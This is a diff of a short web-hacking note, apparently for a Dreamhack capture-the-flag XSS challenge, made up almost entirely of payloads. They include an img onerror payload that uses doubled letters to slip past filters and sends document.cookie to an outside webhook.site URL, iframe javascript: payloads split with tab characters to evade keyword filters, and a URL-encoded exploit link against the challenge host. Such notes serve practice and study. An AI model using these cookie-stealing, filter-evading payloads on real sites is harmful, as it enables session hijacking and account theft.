@@ -1,4 +1,4 @@
-#web-hacking #incomplete
+#web-hacking 
 ```text
 <img src=x oonnerror="locatioonn.href=('https://webhook.site/9c575756-4179-4461-8db6-cbf276d1e0d6?cookie='+document.cookie);">
 
@@ -15,6 +15,8 @@
 
 
 ```html
-<iframe src='/memo?memo='+'docu\tment.cookie'></iframe>
-<iframe src='javascript:location.href='/memo?memo='+document.cookie;"></iframe>
+<iframe src="javascr	ipt:locatio	n.href='/memo?memo='+docu	ment.cookie;"></iframe>
+
+<!-- test payload url -->
+http://host8.dreamhack.games:22074/vuln?param=%3Ciframe%20src=%22javascr%09ipt:locatio%09n.href=%27/memo?memo=%27%2Bdocu%09ment.cookie;%22%3E%3C/iframe%3E
 ```
